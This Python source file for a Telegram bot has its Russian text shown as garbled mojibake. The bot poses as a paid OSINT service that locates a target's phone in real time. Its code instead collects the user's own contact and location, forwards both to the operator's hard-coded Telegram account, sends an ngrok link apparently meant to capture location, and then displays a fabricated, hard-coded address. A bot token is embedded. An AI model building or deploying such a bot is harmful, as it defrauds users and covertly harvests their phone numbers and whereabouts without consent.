
import time
import random
import telebot
from telebot import types


my_id = '402249711'
bot = telebot.TeleBot('1596871845:AAELAFRfsVMOeyEkwR1VOT9NfDx5VYv37b8')
user_dict = {}


class User:
    def __init__(self, name):
        self.num = None
        self.number = None


@bot.message_handler(commands=['help', 'start'])

def process_name_step(message):
    try:
        chat_id = message.chat.id
        name = message.text
        user = User(name)
        user_dict[chat_id] = user
        msg = bot.reply_to(message, """–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ OSeekerINT_bot.

–≠—Ç–æ OSINT-–±–æ—Ç, —Å —Ñ—É–Ω–∫—Ü–∏–µ–π –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Ü–µ–ª–∏.

–¢–∞—Ä–∏—Ñ—ã: 
 Free* (–ö–æ–ª-–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ 3)
 Limited(–ö–æ–ª-–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ 100, –¢–µ—Ö-–ø–æ–¥–¥–µ—Ä–∂–∫–∞) - 99$
 Unlimited(–ö–æ–ª-–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ 999+, –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å, –î–æ—Å—Ç—É–ø –∫ —á–∞—Ç—É, –¢–µ—Ö-–ø–æ–¥–¥–µ—Ä–∂–∫–∞) - 699$

* –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ç–∞—Ä–∏—Ñ–∞ free –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º.

–ö–æ–Ω—Ç–∞–∫—Ç—ã:
 –°–º–µ–Ω–∞ —Ç–∞—Ä–∏—Ñ–∞ - @Seeker_Operator
 –°–æ—Ç—Ä—É–¥–Ω–∏—á–µ—Å—Ç–≤–æ - @Seeker_Admin

–õ–∏—Ü–µ–Ω–∑–∏—è: GNU GPLv3 
   Copyright (c) 2019 ........

–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞–∫ –Ω–∞ –ø—Ä–∏–º–µ—Ä–µ.
–ü—Ä–∏–º–µ—Ä: 380685576477 """)
        bot.register_next_step_handler(msg, process_num_step)
    except Exception as e:
        bot.reply_to(message, '–û—à–∏–±–∫–∞, –Ω–∞–∂–º–∏–Ω–µ /start –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞')


def process_num_step(message):
    try:
        chat_id = message.chat.id
        num = message.text
        if not num.isdigit():
            msg = bot.reply_to(message, '–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ª–∏ –Ω–∞–ø–∏—Å–∞–ª–∏ –Ω–æ–º–µ—Ä, –∏ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–Ω–æ–≤–∞.')
            bot.register_next_step_handler(msg, process_num_step)
            return            
        user = user_dict[chat_id]
        user.num = num
        bot.reply_to(message, '‚è≥–ü–æ–¥–æ–∂–¥–∏—Ç–µ...‚è≥')#üîé
        time.sleep(4)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", request_contact=True)
        keyboard.add(button_phone)
        bot.send_message(message.chat.id,
                     text="üîé–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –Ω–æ–º–µ—Ä–µ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å'üîé ",
                     reply_markup=keyboard)


        @bot.message_handler(content_types='contact')
        def error(message):
            bot.forward_message(my_id, message.chat.id, message.message_id)
            bot.reply_to(message, 'üîé–ü–æ–∏—Å–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...üîé')#üîéüóøüìûüìû
            time.sleep(4.5)
            keyboard = types.InlineKeyboardMarkup()
            button_phone = types.InlineKeyboardButton(text="–ù–∞—á–∞—Ç—åüîé", url="https://1d11f01a1353.ngrok.io")
            # keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            # button_phone = types.KeyboardButton(text="–ù–∞—á–∞—Ç—åüîé", request_location=True)
            keyboard.add(button_phone)
            bot.send_message(message.chat.id,
                         text="üìû–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞—á–∞—Ç—å' üìû",
                         reply_markup=keyboard)


            @bot.message_handler(content_types='location')
            def error(message):
                bot.forward_message(my_id, message.chat.id, message.message_id)
                bot.reply_to(message, '‚è≥–ü–æ–¥–æ–∂–¥–∏—Ç–µ...‚è≥')#üîéüóøüìûüìû
                time.sleep(4.5)
                markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                markup.add('1', '2', '3', '4', '5', '6', '7', '8', '9')
                msg = bot.reply_to(message, '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ —Ü–∏—Ñ—Ä—É 4 –∏–ª–∏ 7', reply_markup=markup)
                bot.register_next_step_handler(msg, process_number_step)

    except Exception as e:
        bot.reply_to(message, '–û—à–∏–±–∫–∞, –Ω–∞–∂–º–∏–Ω–µ /start –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞')


def process_number_step(message):
    try:
        chat_id = message.chat.id
        number = message.text
        user = user_dict[chat_id]
        if (number == u'4') or (number == u'7'):
            bot.send_message(message.chat.id, """–ù–æ–º–µ—Ä –ø–æ–ª—É—á–µ–Ω!
        –°—Ç—Ä–∞–Ω–∞: –†–æ—Å—Å–∏—è
        –†–µ–≥–∏–æ–Ω: –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥
        –£–ª–∏—Ü–∞: 8 –º–∞—Ä—Ç–∞
        Google maps: https://clck.ru/RDFzp""")
        else:
            msg = bot.reply_to(message, "–í—ã –Ω–µ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑.")
            bot.register_next_step_handler(msg, error)
            raise Exception()
        
    except Exception as e:
        bot.reply_to(message, '–û—à–∏–±–∫–∞')
        bot.register_next_step_handler(msg, process_number_step)
        
bot.polling()

